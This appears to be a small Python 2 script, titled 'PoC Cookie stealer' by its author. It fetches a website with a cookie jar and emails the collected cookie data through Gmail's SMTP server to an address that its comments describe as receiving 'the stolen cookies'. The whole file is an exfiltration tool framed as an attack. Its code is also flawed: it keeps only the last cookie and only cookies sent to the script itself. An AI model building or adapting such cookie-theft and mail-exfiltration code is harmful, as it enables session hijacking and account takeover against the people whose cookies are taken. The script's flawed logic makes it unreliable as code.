#!/usr/bin/python
#             _,._             
#         __.o`   o`"-.     PoC Cookie stealer by j0eblack     
#      .-O o `"-.o   O )_,._    
#     ( o   O  o )--.-"`O   o"-.`
#      '--------'  (   o  O    o)  
#                   `----------`
import smtplib
from urllib2 import Request, build_opener, HTTPCookieProcessor, HTTPHandler
import cookielib

cj = cookielib.CookieJar()
opener = build_opener(HTTPCookieProcessor(cj), HTTPHandler())
#Here you put the website for cookie stealing.
req = Request("http://youtube.com")
f = opener.open(req)
html = f.read()
for cookie in cj:
    data=cookie

def send_email():
            #Dummy gmail to use as sender
            gmail_user = "name@gmail.com"
            #Password for the dummy gmail
            gmail_pwd = "gmailpass"
            #Again the sender gmail
            FROM = 'name@gmail.com'
            #Here you put the email you want to receive the stolen cookies
            TO = ['receive@email.com']
            SUBJECT = "Cookies"
            TEXT = "Cookies: %s" %data

            
            message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
            """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
            try:
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.ehlo()
                server.starttls()
                server.login(gmail_user, gmail_pwd)
                server.sendmail(FROM, TO, message)
                server.close()
                print 'Success!'
            except:
                print "Error."
send_email()